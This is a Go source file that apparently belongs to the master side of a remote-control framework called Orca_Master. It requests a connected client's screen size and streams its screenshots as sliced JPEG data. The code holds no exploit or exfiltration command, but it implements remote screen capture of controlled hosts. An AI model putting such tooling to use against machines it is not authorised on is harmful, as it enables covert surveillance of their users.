package screenstreamopt

import (
	"Orca_Master/cli/cmdopt/screenopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/retcode"
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"time"
)

type ScreenSize struct {
	X int
	Y int
}

// 发送远程桌面请求
func SendRemoteDesktopRequesMsg(clientId, sendUserId string) common.HttpRetData {
	msg := "screenStream"
	data := ""
	return common.SendSuccessMsg(clientId, sendUserId, msg, data)
}

// 发送请求获取屏幕分辨率
func SendScreenSizeRequestMsg(clientId, sendUserId string) common.HttpRetData {
	msg := "getScreenSize"
	data := ""
	return common.SendSuccessMsg(clientId, sendUserId, msg, data)
}

// 获取屏幕分辨率
func GetScreenSize(clientId, sendUserId string) (int, int) {
	var screenSize ScreenSize
	retData := SendScreenSizeRequestMsg(clientId, sendUserId)
	if retData.Code != retcode.SUCCESS {
		fmt.Errorf("screen size request failed")
		return 0, 0
	}
	select {
	case msg := <-common.DefaultMsgChan:
		_, _, screenData := common.SettleRetDataBt(msg)
		json.Unmarshal(screenData, &screenSize)
	case <-time.After(5 * time.Second):
		fmt.Errorf("request timed out")
		return 0, 0
	}
	return screenSize.X, screenSize.Y
}

// 发出下一张截图请求
func SendNextScreenRequestMsg(clientId, sendUserId string) common.HttpRetData {
	msg := "nextScreen"
	data := ""
	return common.SendSuccessMsg(clientId, sendUserId, msg, data)
}

// 获取屏幕截图
func GetScreenShotJpeg(requestScreenMsg string) (image.Image, error) {
	screenShotMetaInfo := screenopt.GetMetaInfo(requestScreenMsg)
	sliceNum := screenShotMetaInfo.SliceNum
	// 循环从管道中获取截图元数据并写入
	var jpegData []byte
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-common.ScreenSliceMsgChan:
			jpegData = append(jpegData, metaData...)
		case <-time.After(3 * time.Second):
			return nil, fmt.Errorf("request timed out")
		}
	}
	buffer := bytes.NewBuffer(jpegData)
	convertImg, _, err := image.Decode(buffer)
	return convertImg, err
}

// 处理屏幕请求
func SettleScreenRequest(clientId, sendUserId string) (image.Image, error) {
	// 发送远程桌面请求
	retData := SendRemoteDesktopRequesMsg(clientId, sendUserId)
	if retData.Code != retcode.SUCCESS {
		return nil, fmt.Errorf("remote desktop request failed")
	}

	// 发送下一张屏幕截图请求
	retData = SendNextScreenRequestMsg(clientId, sendUserId)
	if retData.Code != retcode.SUCCESS {
		return nil, fmt.Errorf("remote desktop request failed")
	}
	// 接收消息，显示是否可以接收截图数据
	var requestScreenMsg string
	select {
	case requestScreenMsg = <-common.DefaultMsgChan:
		if common.GetHttpRetCode(requestScreenMsg) != retcode.SUCCESS {
			return nil, fmt.Errorf(common.GetHttpRetMsg(requestScreenMsg))
		}
	case <-time.After(3 * time.Second):
		return nil, fmt.Errorf("request timed out")
	}

	// 获取屏幕截图
	screenshotImg, err := GetScreenShotJpeg(requestScreenMsg)
	if err != nil {
		return nil, err
	}
	return screenshotImg, nil
}
